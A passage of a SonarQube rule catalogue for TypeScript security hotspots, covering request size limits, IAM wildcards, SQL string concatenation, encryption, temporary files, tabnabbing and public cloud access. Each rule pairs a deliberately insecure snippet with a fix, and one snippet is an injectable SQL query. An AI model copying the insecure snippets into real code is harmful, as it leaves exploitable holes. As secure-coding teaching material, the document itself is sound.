  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/538">CWE-538 - File and Directory Information Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5693">
              typescript:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevent DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> size limits are not defined for the different resources of the web application. </li>
  <li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting">rate limiting</a> features. </li>
  <li> the web application infrastructure has limited resources. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul>
      <li> lower or equal to 8mb for file uploads. </li>
      <li> lower or equal to 2mb for other requests. </li>
    </ul>  </li>
</ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/formidable">formidable</a> file upload module:</p>
<pre>
const form = new Formidable();
form.maxFileSize = 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB

const formDefault = new Formidable(); // Sensitive, the default value is 200MB
</pre>
<p><a href="https://www.npmjs.com/package/multer">multer</a> (Express.js middleware) file upload module:</p>
<pre>
let diskUpload = multer({
  storage: diskStorage,
  limits: {
    fileSize: 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB
  }
});

let diskUploadUnlimited = multer({ // Sensitive: the default value is no limit
  storage: diskStorage,
});
</pre>
<p><a href="https://www.npmjs.com/package/body-parser">body-parser</a> module:</p>
<pre>
// 4MB is more than the recommended limit of 2MB for non-file-upload requests
let jsonParser = bodyParser.json({ limit: "4mb" }); // Sensitive
let urlencodedParser = bodyParser.urlencoded({ extended: false, limit: "4mb" }); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/formidable">formidable</a> file upload module:</p>
<pre>
const form = new Formidable();
form.maxFileSize = 8000000; // Compliant: 8MB
</pre>
<p><a href="https://www.npmjs.com/package/multer">multer</a> (Express.js middleware) file upload module:</p>
<pre>
let diskUpload = multer({
  storage: diskStorage,
  limits: {
     fileSize: 8000000 // Compliant: 8MB
  }
});
</pre>
<p><a href="https://www.npmjs.com/package/body-parser">body-parser</a> module:</p>
<pre>
let jsonParser = bodyParser.json(); // Compliant, when the limit is not defined, the default value is set to 100kb
let urlencodedParser = bodyParser.urlencoded({ extended: false, limit: "2mb" }); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6317">
              typescript:S6317
            </a>
          </td>
          <td>
            <details>
              <p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated
resources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions
than expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher
level of access.</p>
<h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)
are called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>"*"</code> permissions for example.) This is especially
true if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of
permissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles
that have more permissions than they need.</p>
<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>
<h3>What is the potential impact?</h3>
<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be
able to perform actions beyond their intended scope.</p>
<h4>Privilege escalation</h4>
<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be
able to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>
<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and
delete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to
exfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe
consequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>
<h2>How to fix it in AWS CDK</h2>
<h3>Code examples</h3>
<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by
altering the code of a Lambda that executes with high privileges.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyDocument({
    statements: [new iam.PolicyStatement({
        effect: iam.Effect.ALLOW,
        actions: ["lambda:UpdateFunctionCode"],
        resources: ["*"], // Noncompliant
    })],
});
</pre>
<h4>Compliant solution</h4>
<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyDocument({
    statements: [new iam.PolicyStatement({
        effect: iam.Effect.ALLOW,
        actions: ["lambda:UpdateFunctionCode"],
        resources: ["arn:aws:lambda:us-east-2:123456789012:function:my-function:1"],
    })],
});
</pre>
<h3>How does this work?</h3>
<h4>Principle of least privilege</h4>
<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted
enough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>
<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy
with overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.
In this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv">Policies and permissions
  in IAM: Grant least privilege</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Rhino Security Labs - <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS IAM Privilege Escalation -
  Methods and Mitigation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-269 - Improper Privilege Management</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2077">
              typescript:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href='/organizations/sopra-steria/rules?open=javascript%3AS3649&rule_key=javascript%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted
queries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some parts of the query come from untrusted values (like user inputs). </li>
  <li> The query is repeated/duplicated in other parts of the code. </li>
  <li> The application must support different types of relational databases. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>
  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
// === MySQL ===
const mysql = require('mysql');
const mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query('SELECT * FROM users WHERE id = ' + userinput, (err, res) =&gt; {}); // Sensitive
});

// === PostgreSQL ===
const pg = require('pg');
const pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query('SELECT * FROM users WHERE id = ' + userinput, (err, res) =&gt; {}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
// === MySQL ===
const mysql = require('mysql');
const mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query('SELECT name FROM users WHERE id = ?', [userinput], (err, res) =&gt; {});
});

// === PostgreSQL ===
const pg = require('pg');
const pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query('SELECT name FROM users WHERE id = $1', [userinput], (err, res) =&gt; {});
</pre>
<h2>Exceptions</h2>
<p>This rule’s current implementation does not follow variables. It will only detect SQL queries which are formatted directly in the function
call.</p>
<pre>
const sql = 'SELECT * FROM users WHERE id = ' + userinput;
mycon.query(sql, (err, res) =&gt; {}); // Sensitive but no issue is raised.
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6319">
              typescript:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The instance contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>
<pre>
import { CfnNotebookInstance } from 'aws-cdk-lib/aws-sagemaker';

new CfnNotebookInstance(this, 'example', {
      instanceType: 'instanceType',
      roleArn: 'roleArn'
}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>
<pre>
import { CfnNotebookInstance } from 'aws-cdk-lib/aws-sagemaker';

const encryptionKey = new Key(this, 'example', {
    enableKeyRotation: true,
});
new CfnNotebookInstance(this, 'example', {
    instanceType: 'instanceType',
    roleArn: 'roleArn',
    kmsKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html">Protect Data at Rest Using Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5689">
              typescript:S5689
            </a>
          </td>
          <td>
            <details>
              <p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a
significant security risk depending on the production environement.</p>
<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>
<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit
known vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those
vulnerabilities.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Version information is accessible to end users. </li>
  <li> Internal systems do not benefit from timely patch management workflows. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying
architectures. This is known as the "need to know" principle.</p>
<p>The most effective solution is to remove version information disclosure from what end users can see, such as the "x-powered-by" header.<br> This
can be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>
<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that
this does not provide as much protection as regular updates and patches.<br> Security by obscurity is the least foolproof solution of all. It should
never be the only defense mechanism and should always be combined with other security measures.</p>
<h2>Sensitive Code Example</h2>
<p>In <a href="https://www.npmjs.com/package/express">Express.js</a>, version information is disclosed by default in the <code>x-powered-by</code>
HTTP header:</p>
<pre>
let express = require('express');

let example = express(); // Sensitive

example.get('/', function (req, res) {
  res.send('example')
});
</pre>
<h2>Compliant Solution</h2>
<p><code>x-powered-by</code> HTTP header should be disabled in <a href="https://www.npmjs.com/package/express">Express.js</a> with
<code>app.disable</code>:</p>
<pre>
let express = require('express');

let example = express();
example.disable("x-powered-by");
</pre>
<p>Or with helmet’s <a href="https://www.npmjs.com/package/helmet">hidePoweredBy</a> middleware:</p>
<pre>
let helmet = require("helmet");

let example = express();
example.use(helmet.hidePoweredBy());
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Information Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5443">
              typescript:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul>
      <li> The generated filename is unpredictable </li>
      <li> The file is readable and writable only by the creating user ID </li>
      <li> The file descriptor is not inherited by child processes </li>
      <li> The file will be destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
const fs = require('fs');

let tmp_file = "/tmp/temporary_file"; // Sensitive
fs.readFile(tmp_file, 'utf8', function (err, data) {
  // ...
});
</pre>
<pre>
const fs = require('fs');

let tmp_dir = process.env.TMPDIR; // Sensitive
fs.readFile(tmp_dir + "/temporary_file", 'utf8', function (err, data) {
  // ...
});
</pre>
<h2>Compliant Solution</h2>
<pre>
const tmp = require('tmp');

const tmpobj = tmp.fileSync(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5148">
              typescript:S5148
            </a>
          </td>
          <td>
            <details>
              <p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not
<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>
<p>For instance, an attacker can put a link (say: "http://example.com/mylink") on a popular website that changes, when opened, the original page to
"http://example.com/fake_login". On "http://example.com/fake_login" there is a fake login page which could trick real users to enter their
credentials.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application opens untrusted external URL. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>
<p>Note: In Chrome 88+, Firefox 79+ or Safari 12.1+ <code>target=_blank</code> on anchors implies <code>rel=noopener</code> which make the protection
enabled by default.</p>
<h2>Sensitive Code Example</h2>
<pre>
window.open("https://example.com/dangerous"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
window.open("https://example.com/dangerous", "WindowName", "noopener");
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing">Reverse Tabnabbing</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1022">CWE-1022 - Use of Web Link to Untrusted Target with window.opener Access</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://mathiasbynens.github.io/rel-noopener/">https://mathiasbynens.github.io/rel-noopener/</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6327">
              typescript:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The topic contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html"><code>aws_cdk.aws_sns.Topic</code></a></p>
<pre>
import { Topic } from 'aws-cdk-lib/aws-sns';

new Topic(this, 'exampleTopic'); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>
<pre>
import { Topic, CfnTopic } from 'aws-cdk-lib/aws-sns';

new CfnTopic(this, 'exampleCfnTopic'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html"><code>aws_cdk.aws_sns.Topic</code></a></p>
<pre>
import { Topic } from 'aws-cdk-lib/aws-sns';

const encryptionKey = new Key(this, 'exampleKey', {
    enableKeyRotation: true,
});

new Topic(this, 'exampleTopic', {
    masterKey: encryptionKey
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>
<pre>
import { CfnTopic } from 'aws-cdk-lib/aws-sns';

const encryptionKey = new Key(this, 'exampleKey', {
    enableKeyRotation: true,
});

cfnTopic = new CfnTopic(this, 'exampleCfnTopic', {
    kmsMasterKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html">AWS Documentation</a> - Encryption at rest </li>
  <li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6329">
              typescript:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul>
  <li> a boolean value that explicitly allows access to the public network. </li>
  <li> the assignment of a public IP address. </li>
  <li> database firewall rules that allow public IP ranges. </li>
</ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul>
  <li> data breaches. </li>
  <li> intrusions into the infrastructure to permanently steal from it. </li>
  <li> and various malicious traffic, such as DDoS attacks. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul>
  <li> should be publicly accessible to any Internet user. </li>
  <li> requires inbound traffic from the Internet to function properly. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html">aws-cdk-lib.aws_ec2.Instance</a> and similar
constructs:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.Instance(this, "example", {
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    vpcSubnets: {subnetType: ec2.SubnetType.PUBLIC} // Sensitive
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnInstance(this, "example", {
    instanceType: "t2.micro",
    imageId: "ami-0ea0f26a6d50850c5",
    networkInterfaces: [
        {
            deviceIndex: "0",
            associatePublicIpAddress: true, // Sensitive
            deleteOnTermination: true,
            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PUBLIC}).subnetIds[0]
        }
    ]
})
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new dms.CfnReplicationInstance(
    this, "example", {
    replicationInstanceClass: "dms.t2.micro",
    allocatedStorage: 5,
    publiclyAccessible: true, // Sensitive
    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,
    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

const rdsSubnetGroupPublic = new rds.CfnDBSubnetGroup(this, "publicSubnet", {
    dbSubnetGroupDescription: "Subnets",
    dbSubnetGroupName: "publicSn",
    subnetIds: vpc.selectSubnets({
        subnetType: ec2.SubnetType.PUBLIC
    }).subnetIds
})

new rds.CfnDBInstance(this, "example", {
    engine: "postgres",
    masterUsername: "foobar",
    masterUserPassword: "12345678",
    dbInstanceClass: "db.r5.large",
    allocatedStorage: "200",
    iops: 1000,
    dbSubnetGroupName: rdsSubnetGroupPublic.ref,
    publiclyAccessible: true, // Sensitive
    vpcSecurityGroups: [sg.securityGroupId]
})
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html">aws-cdk-lib.aws_ec2.Instance</a> and similar
constructs:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.Instance(
    this,
    "example", {
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    vpcSubnets: {subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new ec2.CfnInstance(this, "example", {
    instanceType: "t2.micro",
    imageId: "ami-0ea0f26a6d50850c5",
    networkInterfaces: [
        {
            deviceIndex: "0",
            associatePublicIpAddress: false,
            deleteOnTermination: true,
            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}).subnetIds[0]
        }
    ]
})
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from 'aws-cdk-lib'

new dms.CfnReplicationInstance(
    this, "example", {
    replicationInstanceClass: "dms.t2.micro",
    allocatedStorage: 5,
    publiclyAccessible: false,
    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,
    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>
<pre>
